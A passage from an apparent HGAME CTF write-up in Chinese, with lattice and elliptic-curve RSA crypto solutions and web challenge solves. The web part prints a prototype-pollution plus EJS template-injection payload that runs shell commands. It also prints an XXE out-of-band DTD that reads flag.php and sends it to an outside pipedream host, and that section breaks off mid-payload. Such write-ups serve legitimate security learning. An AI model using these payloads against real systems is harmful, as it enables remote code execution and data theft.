class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"> <span class="keyword">class</span> <span class="title class_">LCG</span>():</span><br><span class="line">       <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">           self.n = next_prime(<span class="number">2</span>**<span class="number">360</span>)</span><br><span class="line">           self.a = bytes_to_long(flag)</span><br><span class="line">           self.seed = randint(<span class="number">1</span>, self.n-<span class="number">1</span>)</span><br><span class="line">   </span><br><span class="line">       <span class="keyword">def</span> <span class="title function_">next</span>(<span class="params">self</span>):</span><br><span class="line">           self.seed = (self.seed * self.a + randint(-<span class="number">2</span>**<span class="number">340</span>, <span class="number">2</span>**<span class="number">340</span>)) % self.n</span><br><span class="line">           <span class="keyword">return</span> self.seed</span><br><span class="line">   </span><br><span class="line">   lcg = LCG()</span><br><span class="line">   </span><br><span class="line">   outputs = []</span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">40</span>):</span><br><span class="line">       outputs.append(lcg.<span class="built_in">next</span>())</span><br><span class="line">   </span><br><span class="line">   <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;output.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">       f.write(<span class="built_in">str</span>(outputs))</span><br></pre></td></tr></table></figure></blockquote><p>修复后，有 $s_{i+1} \equiv as_i+r_i \pmod n,i \in [0,38)$，即 $s_{i+1}=as_i+r_i+k_in,i \in [0,38)$。</p><p>令 $A_i=s_i,B_i=-s_{i+1},x=a$，有 $-r_i = A_ix+B_i+k_in$，典型HNP问题，构建格：</p><p>$M = \begin{bmatrix} n &amp; &amp; &amp; &amp; &amp; &amp; \newline &amp; n &amp; &amp; &amp; &amp; &amp; \newline &amp; &amp;\ddots&amp; &amp; &amp; &amp; \newline &amp; &amp; &amp; n &amp; &amp; &amp; \newline A_0&amp;A_1&amp;\dots &amp; A_{38}&amp;K/n&amp; &amp; \newline B_0&amp;B_1&amp;\dots &amp; B_{38}&amp; &amp; K &amp; \newline \end{bmatrix}=\begin{bmatrix} n &amp; &amp; &amp; &amp; &amp; &amp; \newline &amp; n &amp; &amp; &amp; &amp; &amp; \newline &amp; &amp;\ddots&amp; &amp; &amp; &amp; \newline &amp; &amp; &amp; n &amp; &amp; &amp; \newline s_0&amp;s_1&amp;\dots &amp; s_{38}&amp;K/n&amp; &amp; \newline -s_1&amp;-s_2&amp;\dots &amp; -s_{39}&amp; &amp; K &amp; \newline \end{bmatrix}$</p><p>其中 $K$ 为 $r_i$ 的上界 $K=2^{340}$，则存在一个 $M$ 的整系数线性组合 $v$，用LLL算法可以得到 $v_k$。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">n = <span class="number">2348542582773833227889480596789337027375682548908319870707290971532209025114608443463698998384768703031935081</span></span><br><span class="line">c = [...]</span><br><span class="line"></span><br><span class="line">t = <span class="number">39</span></span><br><span class="line">A = []</span><br><span class="line">B = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">39</span>):</span><br><span class="line">    A.append(c[i])</span><br><span class="line">    B.append(-c[i+<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">K = <span class="number">2</span>^<span class="number">340</span> </span><br><span class="line">X = n * identity_matrix(QQ, t)</span><br><span class="line">Z = matrix(QQ, [<span class="number">0</span>] * t + [K/n] + [<span class="number">0</span>]).transpose()</span><br><span class="line">Z2 = matrix(QQ, [<span class="number">0</span>] * (t+<span class="number">1</span>) + [K]).transpose()</span><br><span class="line"></span><br><span class="line">Y = block_matrix([[X],[matrix(QQ, A)], [matrix(QQ, B)]])</span><br><span class="line">Y = block_matrix([[Y, Z, Z2]])</span><br><span class="line"></span><br><span class="line">Y = Y.LLL()</span><br><span class="line"></span><br><span class="line">k0 = ZZ(Y[<span class="number">1</span>, <span class="number">0</span>] % n)</span><br><span class="line">flag = ZZ(Y[<span class="number">1</span>, -<span class="number">2</span>] / (K/n) % n)</span><br><span class="line"><span class="keyword">assert</span>(k0 == (A[<span class="number">0</span>]*flag + B[<span class="number">0</span>]) % n)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(flag)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;hgame&#123;Repair_modulus_prob1em_5o_HNP_Revenge&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="ECRSA"><a href="#ECRSA" class="headerlink" title="ECRSA"></a>ECRSA</h3><blockquote><p>兔兔拜年时遇到了RSA，听说RSA还没有另一半于是把EC介绍给了他。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sage.all_cmdline <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">Nbits = <span class="number">512</span></span><br><span class="line">x = bytes_to_long(flag)</span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;./output&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_pubkey</span>(<span class="params">Nbits</span>):</span><br><span class="line">    p = getPrime(Nbits // <span class="number">2</span>)</span><br><span class="line">    q = getPrime(Nbits // <span class="number">2</span>)</span><br><span class="line">    n = p*q</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        a = getRandomInteger(Nbits // <span class="number">2</span>)</span><br><span class="line">        b = getRandomInteger(Nbits // <span class="number">2</span>)</span><br><span class="line">        <span class="keyword">if</span> gcd(<span class="number">4</span>*a**<span class="number">3</span> + <span class="number">27</span>*b**<span class="number">2</span>, n) == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    E = EllipticCurve(Zmod(n), [a, b])</span><br><span class="line">    e = getPrime(<span class="number">64</span>)</span><br><span class="line">    f.write(<span class="string">f&quot;p=<span class="subst">&#123;p&#125;</span>\nq=<span class="subst">&#123;q&#125;</span>\n&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> n, E, e</span><br><span class="line"></span><br><span class="line">n, E, e = gen_pubkey(Nbits)</span><br><span class="line">pt = E.lift_x(Integer(x))</span><br><span class="line">ct = pt * e</span><br><span class="line">f.write(<span class="string">f&quot;n = <span class="subst">&#123;n&#125;</span>\na = <span class="subst">&#123;E.a4()&#125;</span>\nb = <span class="subst">&#123;E.a6()&#125;</span>\ne = <span class="subst">&#123;e&#125;</span>\n&quot;</span>)</span><br><span class="line">f.write(<span class="string">f&quot;ciphertext = <span class="subst">&#123;long_to_bytes(<span class="built_in">int</span>(ct.xy()[<span class="number">0</span>]))&#125;</span>\n&quot;</span>)</span><br></pre></td></tr></table></figure></blockquote><p>给出点 $C=eP$ 的横坐标，根据椭圆曲线性质，点 $C$ 也在曲线上。</p><p>再利用 $e$ 对 $\#E(\mathbb{F}_p) \times \#E(\mathbb{F}_q)$ 取模逆即可得到 $E(\mathbb{Z}/n\mathbb{Z})$ 意义下的 $d$，再解密按照RSA方式解密。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">p = <span class="number">115192265954802311941399019598810724669437369433680905425676691661793518967453</span></span><br><span class="line">q = <span class="number">109900879774346908739236130854229171067533592200824652124389936543716603840487</span></span><br><span class="line">n = <span class="number">12659731371633323406361071735480743870942884407511647144758055911931321534333057725377899993936046070028289182446615763391740446071787318153462098556669611</span></span><br><span class="line">a = <span class="number">34573016245861396068378040882622992245754693028152290874131112955018884485688</span></span><br><span class="line">b = <span class="number">103282137133820948206682036569671566996381438254897510344289164039717355513886</span></span><br><span class="line">e = <span class="number">11415307674045871669</span></span><br><span class="line">ciphertext = <span class="string">b&#x27;f\xb1\xae\x08`\xe8\xeb\x14\x8a\x87\xd6\x18\x82\xaf1q\xe4\x84\xf0\x87\xde\xedF\x99\xe0\xf7\xdcH\x9ai\x04[\x8b\xbbHR\xd6\xa0\xa2B\x0e\xd4\xdbr\xcc\xad\x1e\xa6\xba\xad\xe9L\xde\x94\xa4\xffKP\xcc\x00\x907\xf3\xea&#x27;</span></span><br><span class="line"></span><br><span class="line">E = EllipticCurve(Zmod(n), [a, b])</span><br><span class="line">cx = <span class="built_in">int</span>(ciphertext.<span class="built_in">hex</span>(),<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">Ep = E.change_ring(GF(p))</span><br><span class="line">Eq = E.change_ring(GF(q))</span><br><span class="line">d = inverse_mod(e, Ep.order() * Eq.order())</span><br><span class="line"><span class="built_in">print</span>(d)</span><br><span class="line"></span><br><span class="line">cy2 = (cx^<span class="number">3</span> + a * cx + b) % n</span><br><span class="line"></span><br><span class="line">c = cy2</span><br><span class="line">e = <span class="number">2</span></span><br><span class="line"></span><br><span class="line">P.&lt;a&gt; = PolynomialRing(Zmod(p),implementation=<span class="string">&#x27;NTL&#x27;</span>)</span><br><span class="line">f = a^e-c</span><br><span class="line">mps = f.monic().roots()</span><br><span class="line"></span><br><span class="line">P.&lt;a&gt; = PolynomialRing(Zmod(q),implementation=<span class="string">&#x27;NTL&#x27;</span>)</span><br><span class="line">g = a^e-c</span><br><span class="line">mqs = g.monic().roots()</span><br><span class="line"></span><br><span class="line">cy_all = []</span><br><span class="line"><span class="keyword">for</span> mpp <span class="keyword">in</span> mps:</span><br><span class="line">    x = mpp[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> mqq <span class="keyword">in</span> mqs:</span><br><span class="line">        y = mqq[<span class="number">0</span>]</span><br><span class="line">        cy_all.append(CRT_list([<span class="built_in">int</span>(x), <span class="built_in">int</span>(y)], [p, q]))</span><br><span class="line">        </span><br><span class="line"><span class="keyword">for</span> cy <span class="keyword">in</span> cy_all:</span><br><span class="line">    C = E(cx,cy)</span><br><span class="line">    m, _ = (<span class="built_in">int</span>(d)*C).xy()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    </span><br><span class="line"><span class="comment"># b&#x27;hgame&#123;ECC_4nd_RSA_also_can_be_combined&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Shared-Diary"><a href="#Shared-Diary" class="headerlink" title="Shared Diary"></a>Shared Diary</h3><blockquote><p>ek1ng给协会成员写了一个在线共享日记本，不论是谁只要知道密码，都可以在上面记录自己的小秘密。不过好像他的js学的并不好导致无意中引入了漏洞，看来js也有很多安全问题。</p></blockquote><p>node.js Express框架，<code>app.js</code> ：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> session = <span class="built_in">require</span>(<span class="string">&#x27;express-session&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> randomize = <span class="built_in">require</span>(<span class="string">&#x27;randomatic&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> ejs = <span class="built_in">require</span>(<span class="string">&#x27;ejs&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">merge</span>(<span class="params">target, source</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> source) &#123;</span><br><span class="line">        <span class="comment">// Prevent prototype pollution</span></span><br><span class="line">        <span class="keyword">if</span> (key === <span class="string">&#x27;__proto__&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&quot;Detected Prototype Pollution&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (key <span class="keyword">in</span> source &amp;&amp; key <span class="keyword">in</span> target) &#123;</span><br><span class="line">            <span class="title function_">merge</span>(target[key], source[key])</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            target[key] = source[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">app</span><br><span class="line">    .<span class="title function_">use</span>(bodyParser.<span class="title function_">urlencoded</span>(&#123;<span class="attr">extended</span>: <span class="literal">true</span>&#125;))</span><br><span class="line">    .<span class="title function_">use</span>(bodyParser.<span class="title function_">json</span>());</span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;views&#x27;</span>, path.<span class="title function_">join</span>(__dirname, <span class="string">&quot;./views&quot;</span>));</span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;view engine&#x27;</span>, <span class="string">&#x27;ejs&#x27;</span>);</span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">session</span>(&#123;</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&#x27;session&#x27;</span>,</span><br><span class="line">    <span class="attr">secret</span>: <span class="title function_">randomize</span>(<span class="string">&#x27;aA0&#x27;</span>, <span class="number">16</span>),</span><br><span class="line">    <span class="attr">resave</span>: <span class="literal">false</span>,</span><br><span class="line">    <span class="attr">saveUninitialized</span>: <span class="literal">false</span></span><br><span class="line">&#125;))</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">all</span>(<span class="string">&quot;/login&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">method</span> == <span class="string">&#x27;POST&#x27;</span>) &#123;</span><br><span class="line">        <span class="comment">// save userinfo to session</span></span><br><span class="line">        <span class="keyword">let</span> data = &#123;&#125;;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="title function_">merge</span>(data, req.<span class="property">body</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(data);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&quot;login&quot;</span>, &#123;<span class="attr">message</span>: <span class="string">&quot;Don&#x27;t pollution my shared diary!&quot;</span>&#125;)</span><br><span class="line">        &#125;</span><br><span class="line">        req.<span class="property">session</span>.<span class="property">data</span> = data</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(req.<span class="property">session</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// check password</span></span><br><span class="line">        <span class="keyword">let</span> user = &#123;&#125;;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(user);</span><br><span class="line">        user.<span class="property">password</span> = req.<span class="property">body</span>.<span class="property">password</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(user);</span><br><span class="line">        <span class="keyword">if</span> (user.<span class="property">password</span>=== <span class="string">&quot;testpassword&quot;</span>) &#123;</span><br><span class="line">            user.<span class="property">role</span> = <span class="string">&#x27;admin&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (user.<span class="property">role</span> === <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">            req.<span class="property">session</span>.<span class="property">role</span> = <span class="string">&#x27;admin&#x27;</span></span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&quot;login&quot;</span>, &#123;<span class="attr">message</span>: <span class="string">&quot;Login as admin or don&#x27;t touch my shared diary!&quot;</span>&#125;)</span><br><span class="line">        &#125; </span><br><span class="line">    &#125;</span><br><span class="line">    res.<span class="title function_">render</span>(<span class="string">&#x27;login&#x27;</span>, &#123;<span class="attr">message</span>: <span class="string">&quot;&quot;</span>&#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">all</span>(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!req.<span class="property">session</span>.<span class="property">data</span> || !req.<span class="property">session</span>.<span class="property">data</span>.<span class="property">username</span> || req.<span class="property">session</span>.<span class="property">role</span> !== <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&quot;/login&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">method</span> == <span class="string">&#x27;POST&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">let</span> diary = ejs.<span class="title function_">render</span>(<span class="string">`&lt;div&gt;<span class="subst">$&#123;req.body.diary&#125;</span>&lt;/div&gt;`</span>)</span><br><span class="line">        req.<span class="property">session</span>.<span class="property">diary</span> = diary</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&#x27;diary&#x27;</span>, &#123;<span class="attr">diary</span>: req.<span class="property">session</span>.<span class="property">diary</span>, <span class="attr">username</span>: req.<span class="property">session</span>.<span class="property">data</span>.<span class="property">username</span>&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&#x27;diary&#x27;</span>, &#123;<span class="attr">diary</span>: req.<span class="property">session</span>.<span class="property">diary</span>, <span class="attr">username</span>: req.<span class="property">session</span>.<span class="property">data</span>.<span class="property">username</span>&#125;);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">8888</span>, <span class="string">&#x27;0.0.0.0&#x27;</span>);</span><br></pre></td></tr></table></figure><p>审计源码，<code>merge()</code> 函数存在原型链污染漏洞，但禁用了 <code>__proto__</code>，利用 <code>constructor.prototype</code> 绕过。</p><p>将 <code>user.role</code> 设置为<code>admin</code>，绕过权限控制后，进入 <code>/</code> 路由，而 <code>ejs.render()</code> 存在SSTI漏洞，设置 <code>diary</code> 值为 <code>&lt;%- global.process.mainModule.require(&#39;child_process&#39;).execSync(&#39;ls -al /&#39;) %&gt;</code> 即可RCE。</p><p>手动修改 <code>Content-Type</code> 为 <code>application/json</code>，POST payload：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;username&quot;</span><span class="punctuation">:</span><span class="string">&quot;xxx&quot;</span><span class="punctuation">,</span><span class="attr">&quot;password&quot;</span><span class="punctuation">:</span><span class="string">&quot;ttt&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;diary&quot;</span><span class="punctuation">:</span><span class="string">&quot;&lt;%- global.process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;cat /flag&#x27;) %&gt;&quot;</span><span class="punctuation">,</span><span class="attr">&quot;constructor&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;prototype&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;role&quot;</span><span class="punctuation">:</span><span class="string">&quot;admin&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>得到flag：<code>hgame&#123;N0tice_prototype_pollution&amp;&amp;EJS_server_template_injection&#125;</code>。</p><p>​    </p><h3 id="Tell-Me"><a href="#Tell-Me" class="headerlink" title="Tell Me"></a>Tell Me</h3><blockquote><p>Just tell me your thoughts</p></blockquote><p>查看源代码提示 <code>hint: ./www.zip</code>，查看 <code>send.php</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    </span><br><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&quot;REQUEST_METHOD&quot;</span>] == <span class="string">&quot;POST&quot;</span>)&#123;</span><br><span class="line">    <span class="variable">$xmldata</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;php://input&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$xmldata</span>))&#123;</span><br><span class="line">        <span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmldata</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">        &#125;<span class="keyword">catch</span>(<span class="built_in">Exception</span> <span class="variable">$e</span>)&#123;</span><br><span class="line">            <span class="variable">$result</span> = <span class="string">&quot;loading xml data error&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$result</span>;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$data</span> = <span class="title function_ invoke__">simplexml_import_dom</span>(<span class="variable">$dom</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$data</span>-&gt;name) || !<span class="keyword">isset</span>(<span class="variable">$data</span>-&gt;email) || !<span class="keyword">isset</span>(<span class="variable">$data</span>-&gt;content))&#123;</span><br><span class="line">            <span class="variable">$result</span> = <span class="string">&quot;name,email,content cannot be empty&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$result</span>;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$data</span>-&gt;name &amp;&amp; <span class="variable">$data</span>-&gt;email &amp;&amp; <span class="variable">$data</span>-&gt;content)&#123;</span><br><span class="line">            <span class="variable">$result</span> = <span class="string">&quot;Success! I will see it later&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$result</span>;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$result</span> = <span class="string">&quot;Parse xml data error&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$result</span>;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Request Method Not Allowed&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>使用 <code>loadXML()+simplexml_import_dom()</code> 函数解析xml数据，存在XXE漏洞，但无可控制的回显信息，使用外带方式带出命令执行结果。</p><p>在VPS新建 <code>test.dtd</code>，内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///var/www/html/flag.php&quot;&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;https://eo3dgkbstljeu1v.m.pipedream.net?p=%file;&#x27;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure><p>POST数据：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE convert [ </span><br><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http://VPS-IP/test.dtd&quot;&gt;</span><br><span 